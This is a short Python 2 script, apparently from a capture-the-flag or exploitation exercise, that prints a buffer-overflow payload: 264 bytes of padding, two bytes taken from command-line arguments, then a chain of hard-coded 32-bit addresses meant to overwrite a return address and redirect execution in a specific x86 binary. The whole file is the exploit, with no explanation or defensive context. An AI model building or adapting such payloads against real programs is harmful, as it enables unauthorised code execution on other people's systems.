import sys
def get_pwn_str(offset1,offset2):
	return "a"*264+chr(offset1)+chr(offset2)+chr(0x00)+chr(0x00)+"a"*12+chr(0x73)+chr(0x83)+chr(0x04)+chr(0x08)+chr(0x83)+chr(0x83)+chr(0x04)+chr(0x08)+chr(0x9d)+chr(0x83)+chr(0x04)+chr(0x08)+chr(0x6b)+chr(0x84)+chr(0x04)+chr(0x08)+"a"*57

if __name__ == '__main__':
	print get_pwn_str(int(sys.argv[1]),int(sys.argv[2]))
